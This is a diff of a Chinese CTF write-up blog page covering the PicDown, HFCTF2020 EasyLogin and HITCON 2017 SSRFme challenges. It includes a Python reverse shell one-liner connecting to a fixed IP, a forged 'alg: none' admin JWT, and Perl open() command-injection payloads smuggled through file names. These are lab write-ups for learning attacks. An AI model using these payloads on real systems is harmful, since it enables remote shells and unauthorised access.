+<p>no_one _know_the_manager 这边可以执行shell命令但需要匹配secret_key 但是好像拿不到secret.txt<br>但是这边可以通过**/proc/pid/fd/** 读取这个目录包含了进程打开的每一个文件的链接<br>然后/proc/self/fd/3  读取这个拿到key<br>m6Bw1vdzVolP2IxqgbW2e3e4uKtOXZJodwvL7ji6Oic=</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/211.PNG?raw=true" alt="211.PNG"></p>
+<p>key是正确的<br> <strong>传入key和shell就可以执行了但是这边没有回显很烦</strong><br>python <strong>反弹shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;117.21.200.166&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>需要url编码一下 然后出现ok就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((&quot;117.21.200.166&quot;,1234))   #连接的服务器的ip地址,端口</span><br><span class="line">for i in range(10):</span><br><span class="line">    com=input(&quot;command:&quot;)</span><br><span class="line">    s.send(com.encode())     #发送信息</span><br><span class="line">    d=s.recv(1024)           #接受数据的大小</span><br><span class="line">    print(d.decode(),len(d))</span><br></pre></td></tr></table></figure>
+
+<p>用这个脚本连接<br>运行cat/flag  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-109/" data-id="ckuz7ucqx000d3sw76n381i2h" data-title="网鼎杯 2020 白虎组PicDown" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-108" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/13/page-108/" class="article-date">
@@ -476,194 +719,11 @@
 
 
   
-    <article id="post-page-101" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-101/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:09.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-101/">HFCTF2020EasyLogin</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>一点php都没看见 那就只能是js了 <strong>f12 看到一个app.js</strong> 这是基于node.js的koa框架<br>然而这边什么都没有<br>百度找找koa框架的目录结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> controllers目录是项目控制器存放目录：接受请求，处理逻辑</span><br><span class="line">访问controllers/api.js发现处理逻辑</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">​    const secretid = global.secrets.length;</span><br><span class="line">​    global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">​    const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        token: token</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || !password) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">​    const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">​    console.log(sid)</span><br><span class="line"></span><br><span class="line">​    if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">​        throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">​    const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">​    const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">​    if(status) &#123;</span><br><span class="line">​        ctx.session.username = username;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        status</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">        throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">​    const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">​    ctx.rest(&#123;</span><br><span class="line">​        flag</span><br><span class="line">​    &#125;);</span><br><span class="line"></span><br><span class="line">​    await next();</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">    ctx.session.username = null;</span><br><span class="line">    ctx.rest(&#123;</span><br><span class="line">        status: true</span><br><span class="line">    &#125;)</span><br><span class="line">    await next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>需要admin 才能拿到flag</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">​    if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">​        throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">​        global.secrets = [];</span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是<strong>注册又没法注册admin</strong> 只能通过伪造我们是admin来登陆了<br>处理逻辑这边看到了<strong>jwt</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line">const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>伪造假的jwt <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a><br>跑jwtsecret那个跑不出来太慢了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;secretid&quot;: [],</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;123456&quot;,</span><br><span class="line">  &quot;iat&quot;: 1587632063</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiMTIzNDU2IiwiaWF0IjogMTU4NzYzMjA2M30.<br> 然后注册一个账号 登录过程抓包一下改一下</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/179.PNG?raw=true" alt="179.PNG"></p>
-<p>登陆成功抓一下get flag那个请求的包就能拿到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-101/" data-id="ckuz7ucqr00053sw7geoxdaba" data-title="HFCTF2020EasyLogin" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-100" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-100/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:36:22.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-100/">HITCON 2017SSRFme</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>这考点是<strong>get的任意命令执行</strong> 调用命令get来执行从url中获取的参数 然后按照filename新建文件写入get的结果<br>perl里的get函数底层就是调用了open处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file.pm</span><br><span class="line">84: opendir(D, $path) or</span><br><span class="line">132:    open(F, $path) or return new</span><br><span class="line">perl脚本中get命令执行漏洞</span><br><span class="line">touch &#x27;id|&#x27;</span><br><span class="line">GET ’file:id|&#x27;</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
-
-<p>在perl下如果open第二个参数(path)可控就能进行任意代码执行 就类似于把一个文件名拼接入命令导致的命令执行<br>这题给了源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);  // explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   // “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 </span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);     // 改变当前的目录到$sandbox</span><br><span class="line"></span><br><span class="line">$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     // escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">$info = pathinfo($_GET[&quot;filename&quot;]);  // pathinfo() 函数以数组的形式返回文件路径的信息。</span><br><span class="line">$dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   // basename() 函数返回路径中的文件名部分。</span><br><span class="line">@mkdir($dir);</span><br><span class="line">@chdir($dir);</span><br><span class="line">@file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</span><br></pre></td></tr></table></figure>
-
-<p>***escapeshellarg($arg)<em><strong>把字符串转码成</strong>可在shell命令函数</em>*执行的参数，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</span><br></pre></td></tr></table></figure>
-
-
-<p>确保能直接将一个字符串传入shell函数 而且还是确保<strong>安全的</strong>。输入的部分参数就会使用这个函数 <strong>shell函数包含exec() system() 反引号(``)</strong> arg：需要被转码的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pathinfo() 返回一个数组包含path的信息 有一下几个数组元素</span><br><span class="line">[dirname]  //路径</span><br><span class="line">[basename]  //文件名</span><br><span class="line">[extension]  //拓展名</span><br></pre></td></tr></table></figure>
-
-<p><strong>比如：</strong></p>
-<p>对传入的参数进行escapeshellarg函数过滤 创建一个<strong>目录</strong> sandbox/md5(orange+ip) 然后执行get$_get[‘url’] 然后创建文件夹<br>并将get后的结果放入该文件夹下filename传入文件中</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/171.PNG?raw=true" alt="171.PNG"></p>
-<p><strong>remote_addr显示当前浏览该页面用户的ip题目已给出</strong><br>sandbox的目录就是sandbox/09813651a41a9196d2053cdecf08dd70</p>
-<p>先创建文件aaa然后访问 ?url=/&amp;filename=aaa</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/169.PNG?raw=true" alt="169.PNG"></p>
-<p>然后访问sandbox/09813651a41a9196d2053cdecf08dd70/aaa</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/170.PNG?raw=true" alt="170.PNG"></p>
-<p>一个readflag 一个flag 正常是得执行readflag然后才能拿到flag</p>
-<p><strong>perl的open命令可能造成命令执行</strong><br>首先得<strong>满足文件存在</strong>然后才会继续open语句 所有执行命令前得先搞<strong>一个同名文件</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag| 的文件 用于之后的命令执行</span><br><span class="line">?url=file:bash -c /readflag|&amp;filename=aaa 再利用get执行bash -c /readflag|保存到文件中</span><br><span class="line">访问 aaa即可</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/172.PNG?raw=true" alt="172.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-100/" data-id="ckuz7ucqn00013sw70psw8pyv" data-title="HITCON 2017SSRFme" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-99" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-99/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T04:25:31.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-99/">HITCON 2017SSRFme</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>这考点：<strong>get的任意命令执行 调用命令get来执行从url中获取的参数 然后按照filename新建文件写入get的结果</strong><br>perl里的get函数底层就是调用了open处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.pm</span><br><span class="line">84: opendir(D, $path) or</span><br><span class="line">132:    open(F, $path) or return new</span><br></pre></td></tr></table></figure>
-
-<p>perl脚本中get命令执行漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch &#x27;id|&#x27;</span><br><span class="line">GET ’file:id|&#x27;</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
-
-<p>在perl下如果**open第二个参数(path)**可控就能进行任意代码执行 就类似于把一个文件名拼接入命令导致的命令执行<br>这题给了源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);  // explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    </span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   // “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 </span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);     // 改变当前的目录到$sandbox</span><br><span class="line">    </span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     // escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);  // pathinfo() 函数以数组的形式返回文件路径的信息。</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   // basename() 函数返回路径中的文件名部分。</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    // 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>**escapeshellarg($arg)**把字符串转码成可在shell命令函数执行的参数，给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号<br>确保能直接将一个字符串传入shell函数 而且还是确保安全的。输入的部分参数就会使用这个函数 <strong>shell函数包含exec() system() 反引号(``)</strong> </p>
-<p>arg：需要被转码的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pathinfo() 返回一个数组包含path的信息 有一下几个数组元素</span><br><span class="line">[dirname]  //路径</span><br><span class="line">[basename]  //文件名</span><br><span class="line">[extension]  //拓展名</span><br></pre></td></tr></table></figure>
-
-<p>比如：</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/171.PNG?raw=true" alt="171.PNG"></p>
-<p>对传入的参数进行<strong>escapeshellarg函数过滤</strong> <strong>创建一个目录 sandbo/md5(orange+ip)</strong> 然后执行get$_get[‘url’] 然后创建文件夹<br>并将get后的结果放入该<strong>文件夹下filename</strong>传入文件中</p>
-<p><strong>remote_addr显示当前浏览该页面用户的ip题目已给出</strong><br><strong>sandbox的目录就是sandbox/09813651a41a9196d2053cdecf08dd70</strong></p>
-<p>先创建文件aaa然后访问 ?url=/&amp;filename=aaa</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/169.PNG?raw=true" alt="169.PNG"></p>
-<p>然后访问sandbox/09813651a41a9196d2053cdecf08dd70/aaa</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/170.PNG?raw=true" alt="170.PNG"></p>
-<p>一个readflag 一个flag 正常是得执行readflag然后才能拿到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl的open命令可能造成命令执行</span><br><span class="line">首先得满足文件存在然后才会继续open语句 所有执行命令前得先搞一个同名文件</span><br><span class="line">?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag| 的文件 用于之后的命令执行</span><br><span class="line">?url=file:bash -c /readflag|&amp;filename=aaa 再利用get执行bash -c /readflag|保存到文件中</span><br></pre></td></tr></table></figure>
-
-<p>访问 aaa即可</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/172.PNG?raw=true" alt="172.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-99/" data-id="ckuz7ucs2002p3sw7a2x4em8b" data-title="HITCON 2017SSRFme" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -682,7 +742,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -695,23 +755,23 @@
       <ul>
         
           <li>
+            <a href="/2021/10/20/page-127/">page</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/20/page-126/">page</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/20/page-125/">杂项杂项</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
           </li>
         
           <li>
             <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-119/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
-          </li>
-        
-          <li>
